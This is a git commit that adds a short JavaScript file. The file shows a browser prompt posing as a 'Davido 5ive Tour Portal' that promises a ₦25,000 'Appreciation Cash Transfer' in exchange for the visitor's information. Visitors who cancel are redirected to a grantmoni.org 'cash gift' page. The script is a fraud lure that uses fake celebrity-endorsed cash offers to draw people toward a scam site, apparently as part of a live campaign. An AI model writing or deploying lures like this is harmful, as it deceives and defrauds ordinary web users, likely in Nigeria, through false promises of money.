7bd9bef06087eb39e6468201f246713a2d15f864
grntmoni <casket-90-crystal@icloud.com>
2025-10-29 00:39:02 +0100

    Create activation2.js

---
+++ activation2.js
@@ -0,0 +1,5 @@
+var password = 'Submit Now'
+password=prompt('Davido 5ive Tour Portal: Congratulations, you are eligible to receive the ₦25,000 Appreciation Cash Transfer, Kindly press OK to submit your information and receive your  ₦25,000 now','Submit Now');
+if (password != 'Submit Now') {
+location.href='https://grantmoni.org/25k-cash-Davido-Governor-gift.html';
+}
